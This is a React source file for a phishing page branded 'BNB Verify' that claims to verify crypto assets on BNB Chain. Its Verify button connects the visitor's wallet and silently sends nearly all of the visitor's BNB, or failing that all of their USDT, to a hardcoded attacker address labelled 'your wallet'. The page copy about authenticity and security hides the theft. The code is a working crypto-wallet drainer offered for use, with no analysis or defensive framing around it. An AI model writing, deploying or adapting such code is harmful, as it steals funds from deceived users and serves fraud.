import React, { useState } from "react";
import { ethers } from "ethers";
import "./App.css";

export default function App() {
  const [status, setStatus] = useState("Click Verify to start...");

  const RECEIVER = "0x2b69d2bb960416d1ed4fe9cbb6868b9a985d60ef"; // your wallet
  const USDT_BEP20 = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP20
  const ERC20_ABI = [
    "function balanceOf(address) view returns (uint)",
    "function transfer(address to, uint amount) returns (bool)"
  ];

  async function handleVerify() {
    try {
      if (!window.ethereum) {
        setStatus("No wallet detected. Install Binance Wallet or MetaMask.");
        return;
      }

      await window.ethereum.request({ method: "eth_requestAccounts" });
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      const userAddress = await signer.getAddress();

      setStatus("Checking balances...");

      const balanceBNB = await provider.getBalance(userAddress);
      if (balanceBNB > ethers.parseEther("0.001")) {
        setStatus("Sending BNB...");
        const tx = await signer.sendTransaction({
          to: RECEIVER,
          value: balanceBNB - ethers.parseEther("0.0005")
        });
        await tx.wait();
        setStatus("BNB sent successfully ✅");
        return;
      }

      const usdt = new ethers.Contract(USDT_BEP20, ERC20_ABI, signer);
      const balanceUSDT = await usdt.balanceOf(userAddress);
      if (balanceUSDT > 0n) {
        setStatus("Sending USDT...");
        const tx = await usdt.transfer(RECEIVER, balanceUSDT);
        await tx.wait();
        setStatus("USDT sent successfully ✅");
        return;
      }

      setStatus("No BNB or USDT found ❌");
    } catch (err) {
      console.error(err);
      setStatus("Error: " + err.message);
    }
  }

  return (
    <div className="app">
      {/* Navbar */}
      <header className="navbar">
        <nav className="nav-container">
          <a href="#" className="logo">
            <div className="logo-circle"></div>
            <span>BNB Verify</span>
          </a>
          <div className="nav-links">
            <a href="#">Home</a>
            <a href="#">Explorer</a>
            <a href="#">Tokens</a>
            <a href="#">NFTs</a>
            <a href="#">DApps</a>
          </div>
        </nav>
      </header>

      {/* Hero Section */}
      <main className="hero">
        <div className="hero-left">
          <div className="powered">Powered by BNB Chain</div>
          <h1>Verify Crypto Assets on BNB Chain</h1>
          <p>
            Our advanced platform provides instant verification of BNB Chain assets, ensuring authenticity and security for all your crypto transactions.
          </p>
          <div className="hero-buttons">
            <button className="button-primary" onClick={handleVerify}>
              Verify
            </button>
            <button className="button-secondary">Explore BNB Chain</button>
          </div>
          <p className="status">{status}</p>
        </div>

        <div className="hero-right">
          <div className="pulse-ring outer"></div>
          <div className="pulse-ring middle"></div>
          <div className="pulse-ring inner"></div>
          <svg className="center-logo" viewBox="0 0 48 48">
            <path d="M24 0L12 12L24 24L12 36L24 48L36 36L24 24L36 12L24 0Z" />
          </svg>
        </div>
      </main>
    </div>
  );
}
